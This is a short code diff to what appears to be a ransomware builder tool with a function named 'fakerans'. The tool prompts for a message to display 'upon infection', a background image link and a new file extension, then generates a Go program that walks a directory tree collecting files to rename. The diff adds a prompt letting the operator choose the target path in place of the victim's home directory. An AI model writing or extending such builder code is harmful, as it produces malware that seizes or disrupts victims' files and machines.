@@ -340,6 +340,7 @@ def fakerans():
     filepath = input(Fore.RED + "(MIS) Input the name of the text file with the content of the message to display upon infection /> " + Style.RESET_ALL)
     imageback = input(Fore.RED + "(MIS) Input the link for the image to set as background upon infection /> " + Style.RESET_ALL)
     filext = input(Fore.RED + "(MIS) The files will be renamed, input the extension name for the files (w/o the dot) /> " + Style.RESET_ALL)
+    targetpath = input(Fore.RED +  "(MIS) Input the target path /> " + Style.RESET_ALL)
     print(Fore.GREEN + generating + Style.RESET_ALL)
     filecon = open(filepath, "r")
     messagecontent = filecon.read().replace("\n", "\\n")
@@ -411,7 +412,7 @@ func main() {
 	time.Sleep(1 * time.Second)
 	fmt.Printf("\\n1\\n")
 	time.Sleep(1 * time.Second)
-	home, _ = os.UserHomeDir()
+	home = "''' + targetpath + '''"
 	err := filepath.Walk(home, visit(&files))
 	if err != nil {
 		panic(err)
